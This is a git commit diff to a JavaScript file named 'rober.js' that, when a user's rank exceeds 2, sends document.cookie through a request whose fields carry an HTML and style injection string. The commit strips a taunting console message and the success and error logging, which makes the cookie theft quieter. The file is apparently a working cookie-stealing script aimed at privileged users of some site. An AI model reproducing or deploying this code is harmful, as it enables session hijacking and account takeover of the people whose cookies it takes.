8c213717a4b5f3909b3d14ab7c76c4ce3b3e39ff
RakeRuike <50459840+RakeRuike@users.noreply.github.com>
2019-05-09 23:05:06 +0500

    Update rober.js

--- rober.js
+++ rober.js
@@ -1,6 +1,5 @@
 if(user_rank > 2)
   {
-    console.log("In your ass bish!!!");
     send_it(document.cookie);
   }
 
@@ -16,13 +15,11 @@ function send_it(message)
 			underline: 0, 										
 			high: 'yellow;" ></span>  <style="', color: 'rgba(50,50,50,1)', target: 'encnabot'},
 			success: function(result){
-				console.log("Success");
-				console.log(result);
+				
 			}    
 			,
 			error: function(result){
-				console.log("Error");
-				console.log(result);
+				
 			}    
 	   
 	   
